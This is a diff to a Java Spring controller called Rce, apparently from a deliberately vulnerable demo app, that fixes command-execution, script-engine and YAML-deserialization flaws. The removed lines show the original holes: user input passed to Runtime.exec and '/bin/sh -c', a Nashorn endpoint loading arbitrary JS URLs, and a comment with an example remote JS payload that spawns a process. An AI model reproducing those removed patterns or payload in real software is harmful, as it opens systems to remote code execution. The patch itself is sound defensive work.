@@ -8,14 +8,12 @@ import org.springframework.web.bind.annotation.RestController;
 import org.yaml.snakeyaml.Yaml;
 import org.yaml.snakeyaml.constructor.SafeConstructor;
 
-import javax.script.Bindings;
-import javax.script.ScriptContext;
-import javax.script.ScriptEngine;
-import javax.script.ScriptEngineManager;
 import java.io.BufferedInputStream;
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
-import java.sql.DriverManager;
+import java.util.Arrays;
+import java.util.HashSet;
+import java.util.Set;
 
 
 /**
@@ -28,13 +26,21 @@ import java.sql.DriverManager;
 @RequestMapping("/rce")
 public class Rce {
 
+    private static final Set<String> ALLOWED_COMMANDS = new HashSet<>(Arrays.asList(
+            "ls", "whoami", "date", "uptime", "uname", "id", "hostname", "pwd"
+    ));
+
     @GetMapping("/runtime/exec")
     public String CommandExec(String cmd) {
+        if (cmd == null || !ALLOWED_COMMANDS.contains(cmd.trim())) {
+            return "Command not allowed. Allowed commands: " + ALLOWED_COMMANDS;
+        }
         Runtime run = Runtime.getRuntime();
         StringBuilder sb = new StringBuilder();
 
         try {
-            Process p = run.exec(cmd);
+            // Use array form to avoid shell interpretation; only allowlisted commands run
+            Process p = run.exec(new String[]{cmd.trim()});
             BufferedInputStream in = new BufferedInputStream(p.getInputStream());
             BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
             String tmpStr;
@@ -63,10 +69,15 @@ public class Rce {
     @GetMapping("/ProcessBuilder")
     public String processBuilder(String cmd) {
 
+        if (cmd == null || !ALLOWED_COMMANDS.contains(cmd.trim())) {
+            return "Command not allowed. Allowed commands: " + ALLOWED_COMMANDS;
+        }
+
         StringBuilder sb = new StringBuilder();
 
         try {
-            String[] arrCmd = {"/bin/sh", "-c", cmd};
+            // Use array form without shell; only allowlisted commands run
+            String[] arrCmd = {cmd.trim()};
             ProcessBuilder processBuilder = new ProcessBuilder(arrCmd);
             Process p = processBuilder.start();
             BufferedInputStream in = new BufferedInputStream(p.getInputStream());
@@ -85,20 +96,14 @@ public class Rce {
 
 
     /**
-     * http://localhost:8080/rce/jscmd?jsurl=http://xx.yy/zz.js
-     *
-     * curl http://xx.yy/zz.js
-     * var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("open -a Calculator");}
-     *
-     * @param jsurl js url
+     * JS engine endpoint is disabled to prevent remote code execution.
+     * Loading arbitrary user-supplied JS URLs via Nashorn allows full RCE.
      */
     @GetMapping("/jscmd")
-    public void jsEngine(String jsurl) throws Exception{
-        // js nashorn javascript ecmascript
-        ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
-        Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);
-        String cmd = String.format("load(\"%s\")", jsurl);
-        engine.eval(cmd, bindings);
+    public String jsEngine(String jsurl) {
+        // Disabled: loading user-controlled JS URLs in Nashorn allows arbitrary code execution.
+        // No safe way to sandbox Nashorn script execution with user-controlled input.
+        return "This endpoint has been disabled for security reasons.";
     }
 
 
@@ -110,7 +115,8 @@ public class Rce {
      */
     @GetMapping("/vuln/yarm")
     public void yarm(String content) {
-        Yaml y = new Yaml();
+        // Use SafeConstructor to prevent arbitrary object instantiation via YAML deserialization
+        Yaml y = new Yaml(new SafeConstructor());
         y.load(content);
     }
 
